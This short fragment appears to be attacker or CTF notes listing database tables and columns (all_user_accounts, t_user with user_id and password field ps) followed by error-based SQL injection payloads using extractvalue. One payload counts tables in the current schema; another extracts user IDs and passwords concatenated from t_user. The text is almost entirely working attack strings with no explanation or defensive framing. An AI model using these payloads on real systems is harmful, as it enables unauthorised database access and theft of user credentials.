...
login_count all_user_accounts

idx user_id ps mail type
idx id log_time

id=183.237.51.63&pw[]=0&type=2 and extractvalue(rand(),concat(0x01,(select count(table_name) from information_schema.tables where table_schema=database())))%23

and extractvalue(rand(),concat(0x01,(select distinct concat(user_id,0x7c,ps) from t_user limit 0,1)))%23